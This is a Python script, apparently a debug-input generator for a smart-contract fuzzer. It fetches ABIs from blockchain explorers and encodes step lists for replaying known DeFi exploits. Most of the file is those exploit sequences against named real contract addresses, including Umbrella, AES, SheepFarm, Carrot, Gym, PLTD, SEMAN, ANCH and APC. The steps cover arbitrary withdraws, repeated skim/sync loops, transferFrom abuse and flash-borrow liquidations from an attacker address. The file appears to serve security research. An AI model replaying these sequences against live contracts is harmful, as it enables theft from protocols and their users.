from web3 import Web3
import json

import functools
import re
import requests
from retry import retry

headers = {
    'authority': 'etherscan.io',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
              'application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
                  'Chrome/108.0.0.0 Safari/537.36',
}


def get_endpoint(network):
    if network == "eth":
        return "https://etherscan.io"
    elif network == "bsc":
        return "https://bscscan.com"
    elif network == "polygon":
        return "https://polygonscan.com"
    elif network == "mumbai":
        return "https://mumbai.polygonscan.com"
    else:
        raise Exception("Unknown network")

@functools.lru_cache(maxsize=10240)
@retry(tries=3, delay=0.5, backoff=2)
def fetch_etherscan_contract_abi(network, token_address):
    finder = re.compile("id='js-copytextarea2' style='height: 200px; max-height: 400px; margin-top: 5px;'>(.+?)</pre>")
    url = f"{get_endpoint(network)}/address/{token_address}"
    response = requests.get(url, headers=headers)
    response.raise_for_status()
    contract_abi = []
    for i in finder.findall(response.text):
        contract_abi = json.loads(i)

    if "loadIframeSourceProxyRead" in response.text:
        # this is a proxy contract, we need to merge with the implementation contract abi
        base_address_finder = re.compile(" at <a href=\'(.+?)\'>")
        base_address = base_address_finder.findall(response.text)
        if len(base_address) == 0:
            print("Failed to find base address for proxy contract")
        else:
            base_address = base_address[0].split("/")[-1].split("?")[0].split("#")[0]
            res = fetch_etherscan_contract_abi(network, base_address)
            contract_abi += res
    return contract_abi


def generate_debug_file(target, data):
    w3 = Web3()
    for i in data:
        if "name" in i and "args" in i:
            abi = fetch_etherscan_contract_abi(target, i["target"])
            contract = w3.eth.contract(address=i["target"], abi=abi)
            abi_encoded = contract.encodeABI(fn_name=i["name"], args=i["args"]).replace("0x", "")
            print(f"{i['ty'] if 'ty' in i else 'abi'} {i['caller']} {i['target']} {abi_encoded} {hex(i['value'] if 'value' in i else 0).replace('0x', '')} "
                  f"{i['liquidation_percent'] if 'liquidation_percent' in i else 0} "
                  f"{i['warp'] if 'warp' in i else 0} {i['repeats'] if 'repeats' in i else 1}")
        else:
            print(f"{i['ty'] if 'ty' in i else 'abi'} {i['caller']} {i['target']} {hex(i['rand']).replace('0x', '')} {hex(i['value'] if 'value' in i else 0).replace('0x', '')} "
                  f"{i['liquidation_percent'] if 'liquidation_percent' in i else 0} "
                  f"{i['warp'] if 'warp' in i else 0} {i['repeats'] if 'repeats' in i else 1}")



UmbrellaExp = [
    # caller can be arbitrary attacker
    {"caller": "0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e4", "target": "0xB3FB1D01B07A706736Ca175f827e4F56021b85dE", "name": "withdraw", "args": [8792873290680252648282]}
]
# generate_debug_file("eth", UmbrellaExp)


AES = Web3.toChecksumAddress("0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907")
PAIR = Web3.toChecksumAddress("0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3")
ATTACKER = Web3.toChecksumAddress("0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb")
AESExp = [
    {
        "caller": ATTACKER,
        "target": PAIR,
        "name": "sync", "args": []
    },
    {
        "ty": "borrow",
        "caller": ATTACKER,
        "target": AES,
        "value": Web3.toWei(400, "ether"),
        "rand": 20
    },
    {
        "caller": ATTACKER,
        "target": AES,
        "name": "transfer", "args": [PAIR, int(0x0000000000000000000000000000000000000000000889e10a9f6536c4a0c0c)]
    },
    *[
        {
            "caller": ATTACKER,
            "target": PAIR,
            "name": "skim", "args": [PAIR],
            "repeats": 37
        } for _ in range(4)
    ],
    {
        "caller": ATTACKER,
        "target": AES,
        "name": "distributeFee", "args": []
    },
    {
         "caller":ATTACKER,
         "target": PAIR,
         "name": "sync", "args": [],
         "liquidation_percent": 10
    }
]

SheepFarm = "0x4726010da871f4b57b5031E3EA48Bde961F122aA"
SheepExp = [
    *[
        {
            "caller": ATTACKER,
            "target": SheepFarm,
            "name": "register", "args": ["0x4726010da871f4b57b5031E3EA48Bde961F122aA"],
        } for _ in range(100)
    ],

    {
        "caller": ATTACKER,
        "target": SheepFarm,
        "name": "addGems", "args": [],
        "value": int(5e14)
    },
    *[
        {
            "caller": ATTACKER,
            "target": SheepFarm,
            "name": "upgradeVillage", "args": [i],
        } for i in range(3)
    ],
    {
        "caller": ATTACKER,
        "target": SheepFarm,
        "name": "sellVillage", "args": [],
    },
    {
        "caller": ATTACKER,
        "target": SheepFarm,
        "name": "withdrawMoney", "args": [20000],
        "liquidation_percent": 100
    }

]


CarrotExp = [
    {
        "caller": ATTACKER,
        "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
        "name": "transReward", "args": ["bf699b4b000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e84"]
    },
    {
        "caller": ATTACKER,
        "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
        "name": "transferFrom", "args": ["0x00B433800970286CF08F34C96cf07f35412F1161",ATTACKER, 310344736073087429864760]
    }
    # {
    #     "caller": ATTACKER,
    #     "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
    #     "name": "transReward", "args": ["0x223412341234"]
    # },
    # {
    #     "caller": ATTACKER,
    #     "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
    #     "name": "transReward", "args": ["0x323412341234"]
    # },
    # {
    #     "caller": ATTACKER,
    #     "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
    #     "name": "transReward", "args": ["0x423412341234"]
    # },
    # {
    #     "caller": ATTACKER,
    #     "target": "0xcFF086EaD392CcB39C49eCda8C974ad5238452aC",
    #     "name": "transReward", "args": ["0x523412341234"]
    # }
]

ATTACKER = "0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd"
GymExp = [
    {
        "caller": ATTACKER,
        "target": "0xA8987285E100A8b557F06A7889F79E0064b359f2",
        "name": "depositFromOtherContract", "args": [8000000000000000000000666,
                                                     0,
                                                     True,
                                                     ATTACKER]
    },
    {
        "caller": ATTACKER,
        "target": "0xA8987285E100A8b557F06A7889F79E0064b359f2",
        "name": "withdraw", "args": [0],
        "warp": 100000000000,
        "liquidation_percent": 10
    },
    {
        "caller": ATTACKER,
        "target": "0x3a0d9d7764FAE860A659eb96A500F1323b411e68",
        "name": "balanceOf", "args": [ATTACKER],
    }
]


BEGOExp = [
    {
        "caller": ATTACKER,
        "target": "0xc342774492b54ce5F8ac662113ED702Fc1b34972",
        "name": "mint", "args": [int(100000000 * 1e18), "t", ATTACKER, [], [], []],
        "liquidation_percent": 10
    }
]

ATTACKER = "0x9aBF443c311447793e0b7fcBa9440eE812E26881"
PAIR = "0x4397C76088db8f16C15455eB943Dd11F2DF56545"
TOKEN = "0x29b2525e11BC0B0E9E59f705F318601eA6756645"


PLTDExp = [
    {
        "caller": ATTACKER,
        "target": TOKEN,
        "name": "balanceOf", "args": [ATTACKER],
    },
    {
        "caller": ATTACKER,
        "target": TOKEN,
        "name": "balanceOf", "args": [PAIR],
    },
    {
        "caller": ATTACKER,
        "target": "0x29b2525e11BC0B0E9E59f705F318601eA6756645",
        "name": "transfer", "args": [PAIR, int(0x00000000000000000000000000000000000000000001718d0c5ab4c766f15fdf * 2)],
    },
    {
        "caller": ATTACKER,
        "target": PAIR,
        "name": "skim", "args": [ATTACKER],
    },
    {
        "caller": ATTACKER,
        "target": TOKEN,
        "name": "balanceOf", "args": [ATTACKER],
    },
]

BUSD = Web3.toChecksumAddress("0x55d398326f99059ff775485246999027b3197955")
BUSD_RICH = Web3.toChecksumAddress("0x0d0707963952f2fba59dd06f2b425ace40b492fe")
RL = "0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888"
RL_RICH = Web3.toChecksumAddress("0x335ddce3f07b0bdafc03f56c1b30d3b269366666")
Pair = "0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e"

RLExp = [
    # {
    #     "caller": ATTACKER,
    #     "target": BUSD,
    #     "name": "balanceOf", "args": [Pair],
    # },
    {
        "caller": ATTACKER,
        "target": RL,
        "name": "balanceOf", "args": [Pair],
    },
    # {
    #     "caller": BUSD_RICH,
    #     "target": BUSD,
    #     "name": "transfer", "args": [Pair, Web3.toWei(1, "ether")],
    # },
    {
        "caller": RL_RICH,
        "target": RL,
        "name": "transfer", "args": [Pair, Web3.toWei(1, "ether")],
    },
    # {
    #     "caller": ATTACKER,
    #     "target": BUSD,
    #     "name": "balanceOf", "args": [Pair],
    # },
    {
        "caller": ATTACKER,
        "target": RL,
        "name": "balanceOf", "args": [Pair],
    },
    {
        "caller": ATTACKER,
        "target": Pair,
        "name": "mint", "args": [ATTACKER],
    },
    # {
    #     "caller": ATTACKER,
    #     "target": PAIR,
    #     "name": "skim", "args": [ATTACKER],
    # },
    # {
    #     "caller": ATTACKER,
    #     "target": TOKEN,
    #     "name": "balanceOf", "args": [ATTACKER],
    # },
]


ATTACKER = "0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd"

SimpleBorrowExp = [
    {
        "ty": "borrow",
        "caller": ATTACKER,
        "target": BUSD,
        "value": 1000000,
        'rand': 10000
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": BUSD,
        "name": "balanceOf", "args": [ATTACKER],
        "liquidation_percent": 10
    }
]


ATTACKER = Web3.toChecksumAddress("0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb")
SEMAN = "0x6bc9b4976ba6f8C9574326375204eE469993D038"
GVC = "0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e"
PAIR = "0x6637914482670f91F43025802b6755F27050b0a6"

SEMANExp = [
    {
        "ty": "borrow",
        "caller": ATTACKER,
        "target": SEMAN,
        "value": int(1e7),
        'rand': 10000,
        'warp': 1000000000000,
    },
    {
        "ty": "borrow",
        "caller": ATTACKER,
        "target": GVC,
        "value": int(500e18),
        'rand': 10000
    },
    *[
        {
            "ty": "abi",
            "caller": ATTACKER,
            "target": SEMAN,
            "name": "transfer", "args": [PAIR, int(1)],
        } for _ in range(20)
    ],
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": SEMAN,
        "name": "balanceOf", "args": [ATTACKER],
        # "liquidation_percent": 10
    },
]


ANCH = Web3.toChecksumAddress("0xA4f5d4aFd6b9226b3004dD276A9F778EB75f2e9e")
ANCH_PAIR = "0xaD0dA05b9C20fa541012eE2e89AC99A864CC68Bb"
ANCHExp = [
    {
        "ty": "borrow",
        "caller": ATTACKER,
        "target": ANCH,
        "value": int(500),
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": ANCH,
        "name": "balanceOf", "args": [ATTACKER],
    },
    {
        "caller": ATTACKER,
        "target": ANCH,
        "name": "transfer", "args": [PAIR, int(0x0000000000000000000000000000000000000000000889e10a9f6536c4a0c0c)] # slug of balance
    },
    *[
        {
            "caller": ATTACKER,
            "target": PAIR,
            "name": "skim", "args": [PAIR]
        } for _ in range(125)
    ],
    {
        "caller":ATTACKER,
        "target": PAIR,
        "name": "sync", "args": [],
        "liquidation_percent": 10
    }
]

APC = Web3.toChecksumAddress("0x2AA504586d6CaB3C59Fa629f74c586d78b93A025")
MUSD = Web3.toChecksumAddress("0x473C33C55bE10bB53D81fe45173fcc444143a13e")
SWAP = Web3.toChecksumAddress("0x5a88114F02bfFb04a9A13a776f592547B3080237")

APCExp = [
    {
        "ty": "borrow",
        "caller": ATTACKER,
        "target": APC,
        "value": int(500),
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": SWAP,
        "name": "swap", "args": [APC, MUSD, int(100000e18)]
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": APC,
        "name": "balanceOf", "args": [ATTACKER],
        "liquidation_percent": 10,
        "liquidation_target": APC
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": SWAP,
        "name": "swap", "args": [MUSD, APC, int("1")], # slug for MUSD_BALANCE
        "liquidation_percent": 10,
    },
]

BPAIR = "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D"
BVAULTS = "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20"

BDEXExp = [
    {

    }
]


BEGO = ""

Fp1 = Web3.toChecksumAddress( "0xbd9797d280096edf522cfbbe1e0257c4c9c4828a")
Fp1Exp = [
    {
        "ty": "borrow",
        "caller": ATTACKER,
        "target": Fp1,
        "value": int(5e18),
        "rand": 20
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": Fp1,
        "name": "balanceOf", "args": [Web3.toChecksumAddress(ATTACKER)],
        # "liquidation_percent": 10,
    }
]


generate_debug_file("bsc", Fp1Exp)

